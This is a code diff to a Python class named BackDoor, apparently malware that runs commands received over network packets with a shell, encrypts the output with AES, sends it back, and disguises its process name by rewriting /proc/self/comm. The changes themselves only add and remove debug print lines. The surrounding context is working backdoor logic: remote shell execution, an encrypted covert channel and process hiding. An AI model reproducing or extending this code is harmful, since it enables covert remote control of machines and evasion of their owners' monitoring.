@@ -318,6 +318,7 @@ class BackDoor:
         """Sends packets"""
         try:
             send(packets, verbose=0)
+            print("Sent response!")
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
@@ -366,7 +367,7 @@ class BackDoor:
         cmd = self.flag_begin + cmd + self.flag_close
         encrypted_data = self.encrypt_data(cipher, cmd)
         # Convert the encrypted string to bytes
-        print("Encrypted response")
+        print("Encrypted output")
         return encrypted_data
 
     def get_hex_string(self, encrypted_line):
@@ -392,7 +393,6 @@ class BackDoor:
         output = run(cmd, shell=True, capture_output=True, text=True)
         output = output.stdout
         msg = self.prepare_msg(output)
-        print("Now calling prepare data")
         self.prepare_data("", msg)
 
     def filter_packets(self, packet) -> None:
@@ -435,22 +435,15 @@ class BackDoor:
 
     def decrypt_data(self, encrypted_msg: str) -> str:
         encrypted_byte_stream = bytes.fromhex(encrypted_msg)
-        print(1)
         cipher = self.generate_cipher()
         # Initialize a decryptor object
-        print(2)
         decryptor = cipher.decryptor()
-        print(3)
         # Initialize an unpadder object
         unpadder = padding.PKCS7(128).unpadder()
-        print(4)
         # Decrypt and remove padding
         padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
-        print(5)
         msg = unpadder.update(padded_message) + unpadder.finalize()
-        print(6)
         msg = msg.decode()
-        print(7)
         return msg
 
     def encrypt_data(self, cipher, line) -> bytes:
@@ -468,6 +461,7 @@ class BackDoor:
         return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))
 
     def hide_process(self):
+        print(f"Masked process name as: {self.masked_name} ")
         setproctitle.setproctitle(f"{self.masked_name}")
         with open("/proc/self/comm", "w") as f:
             f.write(self.masked_name)
